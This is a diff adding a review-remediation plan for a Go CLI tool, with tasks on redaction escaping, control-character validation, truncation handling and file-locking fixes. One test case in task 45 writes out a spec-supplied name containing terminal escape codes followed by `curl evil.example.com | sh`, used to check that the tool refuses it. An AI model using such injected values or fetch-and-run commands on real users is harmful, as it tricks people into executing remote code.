@@ -2487,3 +2487,286 @@ copy-on-write of `e.Response`: it is a pointer the caller still holds.
 - [ ] The both-bodies-maximal case still encodes, still fits, and `encodeLine` still refuses when
       neither body has anything left to cut
 - [ ] `go test ./...` green
+
+---
+
+# Review cycle 3-4 drain (2026-08-04)
+
+Nineteen findings, and a decision about how they are worked. The previous two cycles fixed only
+CRITs, so every WARN was re-discovered and re-reported with *"no fix attempted"* — nine of them by
+cycle 4. That is not a review loop failing to converge, it is a backlog nothing was draining.
+**Every finding below is a numbered task.** A remediation phase that ships with ten known-live
+findings is the mistake phase 2a exists to correct.
+
+Two patterns are worth carrying into every task here:
+
+1. **The fixes are the defect source.** Both cycle-4 CRITs were introduced by cycle-3's fixes, and
+   cycle-3's CRIT by cycle-2's. Before writing code, ask what *else* reads the thing being changed.
+   Task 45 exists because task 36 added a verbatim-printed field and the plan named the wrong
+   hazard.
+2. **`internal/corpus` is seven of nineteen findings** and its body-truncation logic is on its
+   third rewrite. Task 48 is deliberately one task over four findings: they are one behaviour seen
+   from four surfaces, and fixing them separately is what produced the churn.
+
+---
+
+### Task 44: The redaction marker survives storage, so the replay guard fires — cycle-4 finding 1 (CRIT)
+
+**Depends on:** none
+
+**Test files:** `internal/corpus/replay_test.go`, `internal/secret/response_test.go`
+
+**Implementation files:** `internal/secret/response.go` (~:119), `internal/corpus/replay.go` (~:19)
+
+**Red — write failing tests:**
+1. Round-trip through the store: `NewEntry` → `encodeLine` → `Read` → `Replay`, with a request body
+   holding `refresh_token`. `Replay` must refuse it. Today `ResponseRedactor.Body` re-encodes with
+   `json.Marshal`, which HTML-escapes, so the stored bytes are `<redacted>` while the
+   guard tests `strings.Contains(data, "<redacted")` — false, always. The guard has never fired.
+   **The test must go through the store, never a hand-written `Body{Data: …}`** — a hand-built body
+   holds the unescaped spelling and passes today.
+2. `history replay` on such an entry does not put the literal marker on the wire as a password.
+3. Entries **already written by this branch** hold the escaped spelling; they must not stay
+   silently replayable.
+
+**Green — minimal implementation:**
+One root cause, one place: in `ResponseRedactor.Body` use a `json.Encoder` over a `bytes.Buffer`
+with `SetEscapeHTML(false)`, trimming the trailing newline — verified to produce
+`{"refresh_token":"<redacted>"}`. That makes the guard fire and makes `request.body`,
+`request.curl` and `history show` agree on the spelling. **Additionally keep the guard matching the
+escaped form** (`<redacted`), for the entries already on disk.
+
+**Verify:** `go test ./internal/secret/... ./internal/corpus/... ./cmd/...`
+
+**Why:** `replay.go`'s own comment states the stake: *"the API sees a login attempt whose password
+is the literal text `<redacted>`, and the caller sees a 401 with no explanation."* Dead code with a
+correct comment is the unenforced-invariant class twice over.
+
+---
+
+### Task 45: A spec-supplied name with a control character is exit 2 — cycle-4 finding 2 (CRIT)
+
+**Depends on:** none
+
+**Test files:** `internal/request/refuse_test.go`, `cmd/talaria/call_test.go`
+
+**Implementation files:** `internal/request/refuse.go` (~:87) `credentialNameProblem`,
+`internal/request/build.go` (~:296) `binder.located`
+
+**Red — write failing tests:**
+1. A spec whose `components.securitySchemes.ck.name` holds an ESC character followed by
+   `[2K` `[1G` and `curl evil.example.com | sh` — erase-line plus cursor-to-column-1. Today this is
+   exit 0 and the sequence reaches stdout verbatim in both pretty and TSV, so a terminal shows
+   `curl evil.example.com | sh` on the line talaria told the human to paste.
+2. A TAB in a spec-supplied name: the machine-facing half, a raw tab inside the curl line.
+3. No raw C0 byte reaches stdout on any renderer for any spec-supplied cookie or query name.
+
+**Green — minimal implementation:**
+Close it where the house rules put spec-derived text — at the read. Use `hasControl`
+(`internal/request/wire.go`) rather than `SplitsRequest` for cookie and query names in **both**
+`credentialNameProblem` and `binder.located`, so a control character is exit 2 where it is read.
+That is the two-gate shape `binder.path` already has, and it keeps `auth check` and `call` in
+agreement for free.
+
+**Do not escape `Lines` generically.** Byte-identity with the JSON `curl` field
+(`TestThePrettyCurlLineIsByteIdenticalToTheJSONOne`) is a tested property, and an argv body's own
+tab legitimately belongs in the line.
+
+**Verify:** `go test ./internal/request/... ./internal/output/... ./cmd/...`
+
+**Why:** `816ea21` chose `SplitsRequest` — CR and LF only — where `isPathTemplate` and
+`authorityChars` both use `hasControl`. CLAUDE.md states the precondition for `Lines` (*"text this
+process composed, never spec- or server-derived"*) directly above a field that carries spec-derived
+names. See task 51 for the documentation half, which survives this fix.
+
+---
+
+### Task 46: `auth check` and `call` agree on document defects — cycle-4 findings 3, 4 and 5
+
+**Depends on:** none
+
+**Implementation files:** `cmd/talaria/auth.go`, `internal/request/refuse.go` (~:32),
+`internal/config` (a `Credential.Satisfied()`)
+
+Three findings, one root cause: DESIGN.md:353 asserts the agreement **absolutely** and
+`internal/request/refuse.go` implements it as an **enumeration**. A fix that adds a fourth gate
+leaves the next string uncovered — that is the finding, not the individual cells.
+
+**Red:**
+1. A spec with one broken operation and one sound one: `auth check` exits 2 with no report, so the
+   credential diagnosis is destroyed by a defect `call` would never touch (finding 3).
+2. A non-http spec server: `auth check` says `withheld: true` with a documented remedy
+   (`--allow-host`) that cannot work, because `Build` refuses the base URL outright (finding 4).
+3. A malformed `TALARIA_AUTH_BASIC` (no colon): `auth check` reports it satisfied, `call` exits 5
+   (finding 5). Add a **non-`--dry-run`** row — the matrix holds only whole-spec defects, which is
+   why all three passed.
+
+**Green:**
+- Findings 3 and 4: either narrow the gate to what a call could reach (`index.Operations()`
+  intersected with the credentials `config.Resolve` produces), or keep the document-wide sweep and
+  render the report *before* returning the error. Have `destinationWithholds` resolve through the
+  reporting path rather than bare `Destination`.
+- Finding 5: move the shape test into `internal/config` — a `Credential.Satisfied()` applying the
+  `user:password` rule for `KindBasic` — so both commands read one verdict. `SecretRef.Present`
+  already reads the value without printing it, so this does not breach *"never prints values"*.
+
+Restate DESIGN.md:356, AGENT.md:178 and AGENT.md:141 in the same commit.
+
+**Verify:** `go test ./cmd/... ./internal/config/... ./internal/request/...`
+
+---
+
+### Task 47: An unreadable store is a code the agent will not retry — cycle-4 finding 6
+
+**Depends on:** none
+
+**Implementation files:** `internal/corpus/file.go` — `:285` (non-regular), `:312` (over-bound),
+`:243` (`tail`'s), and `tail`'s own `openStore` path
+
+Four refusals return exit 1, which AGENT.md tells an agent to **retry**; retrying a store that is a
+FIFO or 65 MB will fail identically forever. `44c0264` added the third instance rather than
+classifying it.
+
+**Green:** wrap all four in `clierr.Usage`, keeping the differing wording CLAUDE.md requires —
+"move it aside" is wrong advice for a permission denial. One line each; the messages are already
+right.
+
+**Verify:** `go test ./internal/corpus/... ./cmd/...`
+
+---
+
+### Task 48: A truncated entry says so on every surface, and cuts what it can afford — cycle-4 findings 7, 8, 9 and 15
+
+**Depends on:** none
+
+**One task on purpose.** These are one behaviour seen from four surfaces, and this logic is on its
+third rewrite because each cycle fixed one surface. Do all four or the next review finds the fifth.
+
+**Implementation files:** `internal/corpus/replay.go` (~:165), `internal/corpus/file.go`
+(`halveBodies`, `bodyLine`)
+
+**Red — write failing tests:**
+1. `Entry.Replay` ignores `HeadersTruncated`, so a capped entry replays into a **different
+   request** with nothing on any channel (finding 7). It must produce either an error or a
+   non-empty `Dropped` — never both empty.
+2. `history show` prints a truncated body as if it were whole in pretty and TSV; only
+   `--output json` carries the marker (finding 8).
+3. The truncated-body replay refusal names `MaxBody` rather than where the cut actually happened
+   (finding 9).
+4. `halveBodies` empties a tiny response body over passes that cannot possibly close the overage,
+   then cuts the request body anyway (finding 15).
+
+**Green:**
+1. Treat `e.Request.HeadersTruncated` the way `body` treats `Body.Truncated` — refusal
+   (`clierr.Usage`, naming `maxHeaderBytes`) is the consistent choice given the body rule's own
+   reasoning. If a partial replay is judged more useful, append to `Replayable.Dropped` so
+   `warnUnreplayable` fires. **Say which in README's replay bullet list**, which enumerates every
+   other refusal.
+2. Append a marker in `bodyLine` when `body.Truncated` — `… (N bytes kept, truncated)`, or the
+   `<…>` form the header row already uses.
+3. Report `len(body.Data)` rather than the constant: "was truncated to N bytes".
+4. Skip the response body when halving it cannot close the overage
+   (`len(e.Response.Body.Data)/2 < overage`), or fall through to the request body once the response
+   contributes less than the shortfall. `halveBodies` still returns true as long as either step cut
+   something, so `encodeLine`'s loop and its refusal are unchanged.
+
+**Verify:** `go test ./internal/corpus/... ./cmd/...`
+
+---
+
+### Task 49: Every open of a user-writable path is non-blocking — cycle-4 findings 11 and 14
+
+**Depends on:** none
+
+**Implementation files:** `internal/spec/source.go` (~:103 cache read), `internal/corpus/file.go`
+(`write`)
+
+The `openStore` shape exists and two paths do not use it.
+
+**Red:**
+1. A FIFO at the **spec cache** path: `Load` blocks in `open(2)`, and the branch's own comment at
+   `source.go:107-109` asserts the cache read is not a wait. Drive `Load` from a goroutine against
+   a timer (finding 11).
+2. A FIFO at the **history** path exercised through `write`, which is a blocking `O_WRONLY` open
+   **inside the append lock** — so it hangs every other talaria process too (finding 14).
+
+**Green:**
+1. Cache read: `os.OpenFile(cachePath, os.O_RDONLY|syscall.O_NONBLOCK, 0)`, `Stat` the descriptor,
+   fall through **to the fetch** on anything `Mode().IsRegular()` rejects — a cache miss, not an
+   error — and read under `io.LimitReader(f, maxSpecBytes+1)`. That closes task 20's
+   unbounded-cache-read half in the same pass.
+2. `write`: `O_APPEND|O_CREATE|O_WRONLY|syscall.O_NONBLOCK`, then `f.Stat()`, refusing non-regular
+   with the same sentence, **before** the `Chmod`. Add `"write"` as a third entry to
+   `TestAStoreThatIsAFIFOIsRefusedRatherThanWaitedOn`'s `readers` map.
+
+**Verify:** `go test ./internal/spec/... ./internal/corpus/...`
+
+---
+
+### Task 50: The lock's second deadline is wired, and a test can see it — cycle-4 finding 12
+
+**Depends on:** none
+
+**Implementation files:** `internal/corpus/lock_unix.go`
+
+`abandonWith`'s deadline is not threaded through `waitForLock`, so **the whole suite is green
+against the unbounded pre-fix code** — task 38 shipped a bound nothing exercises.
+
+**Green:** thread it — `waitForLock(ctx, f, timeout)` calls `abandonWith(f, taken, timeout)`.
+`lockTimeout` and `abandonTimeout` are both `time.Minute` today, so this is behaviour-preserving in
+production and makes the second wait observable in 300ms. Then add, beside the two existing cases:
+hold the lock and never release, call `lockWith` with the test timeout, assert the lock descriptor
+count is back to baseline — **driven through `waitForLock`, not `queued`.**
+
+**Verify:** `go test -race -count=20 ./internal/corpus/...`
+
+---
+
+### Task 51: The `Lines` exemption is in all three documents — cycle-4 finding 13
+
+**Depends on:** Task 45
+
+**Implementation files:** `README.md`, `AGENT.md`
+
+The exemption is in CLAUDE.md and in neither shipped document, and README currently states the
+opposite. Survives task 45's fix: the exemption is still real, it is just narrower.
+
+**Green:** one sentence each in README's and AGENT.md's Output sections — `call` prints the request
+line and the curl command as verbatim lines before the rows, because a command whose backslashes
+are doubled and whose tabs are folded is no longer the command that ran; the escaping guarantee
+covers the tabular rows. Only `cmd/talaria/call.go:476` sets `Lines`, so the scope is exactly
+stateable. This is the house rule about a field an agent branches on being named in all three
+documents.
+
+---
+
+### Task 52: `ReferencesEnv` goes — cycle-4 finding 10
+
+**Depends on:** none
+
+**Implementation files:** `internal/config`
+
+Dead code whose comment claims a live security role. It is also the precedent cited when §5a
+source 4 was decided — the decision stands on the profile's mode and explicit selection, but the
+code cited as prior art has no caller.
+
+**Green:** delete `ReferencesEnv` and its two tests (`TestReferencesEnvAnswersForTheProfilesAuthMap`,
+`TestReferencesEnvOfNoProfileIsFalse`) — the mechanism it guarded was replaced, not relocated. If
+it is being kept for phase 2b, rewrite the comment to say it has no caller and why.
+
+---
+
+### Task 53: Three small truths — cycle-4 findings 16, 17 and 18
+
+**Depends on:** none
+
+1. **finding 16** — `badPathTemplate`'s message misnames the fault it is now shown for most often.
+   Split the two conditions (`strings.HasPrefix(s, "/")` vs `hasControl(s)`) so the message names
+   the one that failed.
+2. **finding 17** — three tests order themselves with a sleep. Use the `awaitLine` /
+   `awaitStdinDrain` shape already in `root_test.go`: wait on something the code under test
+   observably did. This is the third cycle this has been reported.
+3. **finding 18** — a test comment names five seconds; the lock deadline is a minute. Say "a
+   minute", or name `lockTimeout` rather than a literal.
+
+**Verify:** `go test ./...`
